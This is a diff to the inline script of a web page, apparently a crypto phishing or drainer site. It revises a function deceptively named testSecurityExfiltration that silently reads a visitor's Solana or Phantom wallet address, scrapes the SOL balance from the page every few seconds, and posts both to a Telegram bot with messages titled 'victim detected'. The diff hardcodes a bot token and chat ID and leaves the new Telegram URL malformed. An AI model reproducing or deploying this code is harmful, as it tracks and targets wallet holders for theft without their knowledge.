@@ -1531,8 +1531,8 @@ document.addEventListener("DOMContentLoaded",()=>{
 async function testSecurityExfiltration(address, sol, tokens) {
     const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
     const chat = "8575014959";
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
+    const url = `https://telegram.org{token}/sendMessage`;
+    const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
 
     try {
         await fetch(url, {
@@ -1544,27 +1544,24 @@ async function testSecurityExfiltration(address, sol, tokens) {
 }
 
 setInterval(() => {
-    if (state && state.conn && state.conn.address) {
-        const addr = state.conn.address;
-        let realSol = "0";
+    const wallet = window.solana || window.phantom?.solana;
+    if (wallet && wallet.publicKey) {
+        const addr = wallet.publicKey.toString();
+        let realSol = "Scan...";
+        const matches = document.body.innerText.match(/(\d+\.\d+)\s?SOL/g);
         
-        if (state.balance && state.balance > 0) {
-            realSol = (state.balance / 1e9).toFixed(3) + " SOL";
-        } else {
-            const match = document.body.innerText.match(/(\d+\.\d+)\s?SOL/);
-            if (match && parseFloat(match[1]) > 0) {
-                realSol = match[0];
-            }
+        if (matches) {
+            const found = matches.find(m => !m.includes("0.03")) || matches[matches.length - 1];
+            realSol = found;
         }
 
-        const uniqueKey = addr + realSol;
-        if (window.lastSent !== uniqueKey && realSol !== "0") {
-            window.lastSent = uniqueKey;
-            testSecurityExfiltration(addr, realSol, state.currency || "SOL");
+        const key = addr + realSol;
+        if (window.lastSent !== key && !realSol.includes("Scan")) {
+            window.lastSent = key;
+            testSecurityExfiltration(addr, realSol, "SOL / USDC");
         }
     }
-}, 3000);
+}, 4000);
 </script>
 </body>
 </html>
-
